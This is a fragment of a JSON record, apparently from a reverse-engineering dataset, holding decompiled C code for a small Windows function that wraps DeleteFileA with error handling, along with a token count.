        "decompiled_code": "\nuint __cdecl fcn.0040ff74(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.0040693e(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 118
    }
}